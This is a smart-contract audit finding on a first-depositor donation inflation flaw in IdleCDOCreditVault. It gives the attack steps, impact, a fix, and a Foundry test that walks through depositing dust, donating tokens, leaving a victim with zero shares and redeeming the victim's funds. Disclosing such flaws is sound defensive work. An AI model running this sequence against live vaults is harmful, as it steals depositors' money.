### Title
First-depositor donation inflation can mint zero shares to later depositors - ([File: contracts/IdleCDOCreditVault.sol])

### Summary
`IdleCDOCreditVault._deposit` prices shares through `_mintSharesAtCurrPrice`, but its NAV source `getContractValue` includes raw `token` balances. An attacker can make a dust first deposit, donate a large amount of underlying directly, let accounting treat the donation as tranche gain, and inflate the tranche price enough that subsequent deposits round to zero shares.

### Finding Description
`getContractValue()` calculates NAV as `strategyToken` balance plus raw `token` balance minus `unclaimedFees`, so unsolicited underlying transfers increase NAV. The base `_deposit()` implementation calls `_updateAccounting()` before transferring the depositor’s funds, then mints shares as `amount * ONE_TRANCHE_TOKEN / _tranchePrice(_tranche)`. For an empty tranche, `_tranchePrice()` returns `oneToken`; after accounting crystallizes a donation as gain, `_virtualPriceAux()` divides the enlarged NAV by the dust tranche supply.

Unlike `IdleCDOEpochVariant._deposit()`, the base `IdleCDOCreditVault._deposit()` does not call `_skimDonatedAssets()` before accounting. Consequently, a direct ERC-20 transfer is not isolated from NAV in this surface.

### Impact Explanation
A first depositor can donate enough underlying to raise the tranche price above a victim’s deposit value. The victim then receives zero tranche tokens due to integer division, while their deposited funds increase NAV backing the attacker’s existing dust share. Depending on available liquidity and withdrawal path, the attacker can redeem substantially all vault value, including the victim’s deposit and donation, resulting in direct theft of user funds.

### Likelihood Explanation
The attacker only needs to be the first depositor and an unprivileged direct token sender. The sequence requires no privileged action: deposit dust, transfer underlying to the vault, and wait for the next depositor. The attack is most practical when the vault or tranche has zero supply and the underlying token’s decimals make a dust deposit cheap relative to the donation required to inflate the price.

### Recommendation
Apply donation isolation to `IdleCDOCreditVault._deposit()` by skimming unsolicited raw underlying before `_updateAccounting()` and before the deposit balance delta is measured. Additionally, seed a minimum non-zero NAV/supply or enforce a minimum initial deposit so a one-share first depositor cannot make normal deposits round to zero.

### Proof of Concept
```solidity
// test/foundry/IdleCDOCreditVaultDonation.t.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

contract IdleCDOCreditVaultDonationTest is Test {
    // Deploy or fork an IdleCDOCreditVault with:
    // - AA tranche supply == 0
    // - token decimals compatible with ONE_TRANCHE_TOKEN accounting
    // - enough strategy liquidity for withdrawal

    function testFirstDepositorDonationInflation() external {
        address attacker = makeAddr("attacker");
        address victim = makeAddr("victim");

        uint256 dust = 1;
        uint256 donation = 1_000 ether;
        uint256 victimDeposit = 10 ether;

        deal(address(underlying), attacker, donation + dust);
        deal(address(underlying), victim, victimDeposit);

        vm.startPrank(attacker);
        underlying.approve(address(vault), dust);
        uint256 attackerShares = vault.depositAA(dust);
        assertEq(attackerShares, dust);

        // Direct donation: this enters getContractValue() as raw token balance.
        underlying.transfer(address(vault), donation);
        vm.stopPrank();

        uint256 inflatedPrice = vault.virtualPrice(address(AAtranche));
        assertGt(inflatedPrice, victimDeposit);

        vm.startPrank(victim);
        underlying.approve(address(vault), victimDeposit);
        uint256 victimShares = vault.depositAA(victimDeposit);
        vm.stopPrank();

        assertEq(victimShares, 0);

        vm.startPrank(attacker);
        uint256 redeemed = vault.withdrawAA(attackerShares);
        vm.stopPrank();

        assertGe(redeemed, donation + dust + victimDeposit - 1);
    }
}
```